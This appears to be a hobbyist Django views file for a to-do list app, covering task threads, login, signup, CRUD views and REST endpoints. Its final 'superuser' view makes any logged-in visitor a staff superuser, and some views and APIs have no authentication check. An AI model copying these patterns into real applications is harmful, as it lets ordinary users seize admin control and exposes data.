from pickle import TRUE
from threading import Thread
from django.shortcuts import redirect, render
from rest_framework import response
from home.models import Task,threads
from django.contrib.auth.models import User
from django.contrib.auth import authenticate,login,logout
from django.http import HttpResponse
from django.shortcuts import get_object_or_404
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from home.models import Task,threads
from todoList.serializers import TaskSerializer, threadsSerializer



def tasks(request,id = None,time = None):
    if request.user.is_anonymous:
        return redirect("/login")
    else:
        datas = {}        
        if time:
            
            specific = threads.objects.get(id =4)
            tile = Task.objects.filter(time=time)
            # print(tile)
            datas[f'{specific.Title}'] = tile 
        if id:

            specific = threads.objects.get(id =id)
            tile = Task.objects.filter(thread=specific)
            # print(tile)
            datas[f'{specific.Title}'] = tile 
        else:
            allthread = threads.objects.all()
            for i in range(allthread.count()):
                tile = Task.objects.filter(thread=allthread[i])
                # print(tile)
                datas[f'{allthread[i].Title}'] = tile 
    
        if request.method == "POST":
            desc = request.POST['desc']
            thread_input = request.POST['thread']
            # print(thread_input)
            thread_object = threads.objects.filter(Title = thread_input).first()
            context={'mydict':datas}
            ins = Task(taskDesc=desc,thread = thread_object)
            ins.save()
        else:
            context = {'mydict':datas}
        
    return render(request, 'tasks.html',context)


def threadsa(request):
    allthread = threads.objects.all()
    datas = {}
    for i in range(allthread.count()):
        tile = Task.objects.filter(thread=allthread[i])
        # print(tile)
        datas[f'{allthread[i].Title}'] = tile 
    
    if request.method == "POST":
        title = request.POST['tile']
        # print("slo")
        thread_object = threads.objects.create(Title = title)
        context= {'thread':allthread}
        
    context= {'mydict':datas}
    return render(request,'tasks.html',context)    

def thread(request):
    allthread=threads.objects.all()
    context = {'thread':allthread}
    return render(request,'tasks.html',context) 

def list(request):
    if request.user.is_anonymous:
        return redirect("/login")
    else:
        allthread=threads.objects.all()
        datas = {}
        for i in range(allthread.count()):
            tile = Task.objects.filter(thread=allthread[i])
            #print(tile)
            datas[f'{allthread[i].Title}'] = tile 
        # print(datas)
        sqw = threads.objects.all() #threads objects only considered !!
        if request.method =="POST":
            context={'success': True}
            tiles=request.POST['tile']
            context={'thread':allthread}
            ins2=threads(Title=tiles)

            ins2.save()
            context = {'thread':allthread,'mydict':datas} #context added 
            redirect(request.path)
        else:
            context = {'thread':allthread,'mydict':datas,'threadssqw':sqw}
    return render(request,'list.html',context) 

def loginUser(request):
    if request.method == "POST":
        username=request.POST.get('username',False)
        password=request.POST.get('password',False)
        user = authenticate(username=username, password=password)
        # print(username,password)
        if user is not None:
            login(request,user)
            return redirect("/tasks")
        else:
            return render(request,'login.html')
    return render(request,'login.html')

def logoutUser(request):
    logout(request)
    return render(request,'loggedout.html')

def registered(request):
    return render(request,'registered.html')

def signup(request):
    if request.method == "POST":
        username=request.POST.get('username',False)
        email=request.POST.get('email',False)
        password=request.POST.get('password',False)
        created = User.objects.create_user(username=username,email=email,password=password)
        created.save()
        return redirect("/registered")
    return render(request,'signup.html')

class TaskApi(APIView):
    #visit apitask
    def get(self,request):
        task1 = Task.objects.all()
        serializer = TaskSerializer(task1, many=True)
        return Response(serializer.data)

    def post(self):
        pass

class threadApi(APIView):
    # visit apithread
    def get(self,request):
        task2 = threads.objects.all()
        serializer1 = threadsSerializer(task2, many=True)
        return Response(serializer1.data)

    def post(self):
        pass


# # <----------task updation starts----------------------------->
def update_task(request,pk):
    if request.user.is_anonymous:
        return redirect("/login")
    else:
        datas = {}        
        allthread = threads.objects.all()
        for i in range(allthread.count()):
            tile = Task.objects.filter(thread=allthread[i])
            # print(tile)
            datas[f'{allthread[i].Title}'] = tile 
            
        update = Task.objects.get(id=pk)
        if request.method == "POST":
            desc = request.POST['desc']
            thread_input = request.POST['thread']
            # print(thread_input)
            thread_object = threads.objects.filter(Title = thread_input).first()
            # ins = Task(taskDesc=desc,thread = thread_object)
            # ins.save()
            update.taskDesc = desc
            update.thread = thread_object
            update.save()
            # context={'update':update,'mydict':datas}
        else:
            pass
        context = {'update':update,'mydict':datas}
        # context = {'update':update}
        return render(request,'update.html',context)
# <----------updation ends----------------------------->


# # <----------task deletion starts----------------------------->
def delete(request,pk):
    if request.user.is_anonymous:
        return redirect("/login")
    else:
        delete_task = Task.objects.get(id=pk)
        if request.method == 'POST':
            delete_task.delete()
            return redirect('/tasks')
        return render(request,'delete.html')
# # <----------deletion ends----------------------------->


# # <----------list updation starts----------------------------->
def updatel(request,pk):
    if request.user.is_anonymous:
        return redirect("/login")
    else:
        allthread=threads.objects.all()
        datas = {}
        for i in range(allthread.count()):
            tile = Task.objects.filter(thread=allthread[i])
            #print(tile)
            datas[f'{allthread[i].Title}'] = tile 
    
        list_obj = threads.objects.get(id=pk)
        if request.method =="POST":
            context={'success': True}
            tiles=request.POST['tile']
            list_obj.Title = tiles 
            list_obj.save()
            context={'thread':allthread,'list_obj':list_obj}
            redirect('/list')
        else:
            context = {'thread':allthread,'mydict':datas}
    return render(request,'listu.html',context)
# # <----------list updation ends----------------------------->



# # <----------list deletion starts----------------------------->
def deletel(request,pk):
    if request.user.is_anonymous:
        return redirect("/login")
    else:
        delete_list = threads.objects.get(id=pk)
        if request.method == 'POST':
            delete_list.delete()
            return redirect('/list')
        return render(request,'delete.html')
# # <----------deletion ends----------------------------->
def superuser(request):
    if request.user.is_anonymous:
        return redirect("/login")
    else:
        user  = request.user
        user.is_staff = True
        user.is_superuser = True
        user.save()
        return render(request,'hlo.html')
